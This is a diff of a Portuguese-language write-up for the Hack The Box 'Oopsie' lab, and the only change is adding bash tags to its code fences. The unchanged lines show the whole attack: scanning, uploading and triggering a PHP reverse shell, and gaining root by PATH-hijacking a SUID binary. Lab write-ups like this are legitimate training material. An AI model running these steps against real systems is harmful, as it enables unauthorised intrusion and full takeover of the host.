@@ -25,7 +25,7 @@ alt: "HTB Oopsie Writeup"
 ## RECON
 
 ### Nmap
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Oopsie]
 └─$ sudo nmap -v -sCV -p- -Pn -O 10.10.10.28 --min-rate=512
 PORT   STATE SERVICE VERSION
@@ -57,7 +57,7 @@ Porém, no rodapé da página encontramos um e-mail de contato que pode ser úti
 
 Vamos rodar o `gobuster` para enumerar os diretórios.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Oopsie]
 └─$ gobuster dir -e -u http://10.10.10.28/ -w /usr/share/wordlists/dirb/common.txt -r
 ===============================================================
@@ -144,7 +144,7 @@ Como vimos na URL que se trata de PHP, podemos inserir um reverse shell em PHP, 
 
 Vamos copiar um deles com o nome `shell.php`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Oopsie]
 └─$ cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
 
@@ -167,7 +167,7 @@ E conseguimos o upload com sucesso.
 
 Como já identificamos o diretório `uploads` com o gobuster, podemos fazer um curl para nosso shell.php e verificar nosso netcat.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Oopsie]
 └─$ curl http://10.10.10.28/uploads/shell.php
 ```
@@ -180,7 +180,7 @@ Porém estamos num shell com o usuário `www-data` que basicamente não tem priv
 
 No diretório `/home` vemos somente um usuário:
 
-```
+```bash
 www-data@oopsie:/home$ ls -la
 ls -la
 total 12
@@ -208,7 +208,7 @@ A flag do usuário se encontra em seu diretório.
 
 Enumerando o usuário, percebemos que ele faz parte do grupo `bugtracker`.
 
-```
+```bash
 robert@oopsie:~$ id
 id
 uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
@@ -216,7 +216,7 @@ uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
 
 Fazendo enumeração local com um usuário com maiores privilégios que o anterior, encontramos um binário com permissões de execussão para o grupo `bugtracker`.
 
-```
+```bash
 robert@oopsie:~$ find / -type f -group bugtracker 2>/dev/null
 find / -type f -group bugtracker 2>/dev/null
 /usr/bin/bugtracker
@@ -224,7 +224,7 @@ find / -type f -group bugtracker 2>/dev/null
 
 Ao enumerar as permissões do binário, perccebemos que ele executa como `root`.
 
-```
+```bash
 robert@oopsie:/tmp$ ls -la /usr/bin/bugtracker
 ls -la /usr/bin/bugtracker
 -rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
@@ -244,7 +244,7 @@ Percebemos que em determinado momento, o binário usa a função `cat` do SO em 
 
 Primeiro vamos criar um arquivo `cat` no diretório `/tmp` contendo o comando `/bin/bash`.
 
-```
+```bash
 robert@oopsie:/tmp$ echo '/bin/bash' > cat
 echo '/bin/bash' > cat
 robert@oopsie:/tmp$ ls -la
@@ -258,13 +258,13 @@ drwxr-xr-x 24 root     root     4096 Jan 27  2020 ..
 
 Em seguida damos permissão total de execução para o arquivo.
 
-```
+```bash
 robert@oopsie:/tmp$ chmod +x cat
 ```
 
 Em seguida, adicionamos o diretório `/tmp` no PATH do SO.
 
-```
+```bash
 robert@oopsie:/tmp$ export PATH=/tmp:$PATH
 ```
 Agora ao executar o binário, quando ele chamar a função `cat`, ele irá executar o arquivo que criamos em `/tmp`. Como o dono do arquivo é `root`, ele irá executar `/bin/bash` com privilégios administrativos.
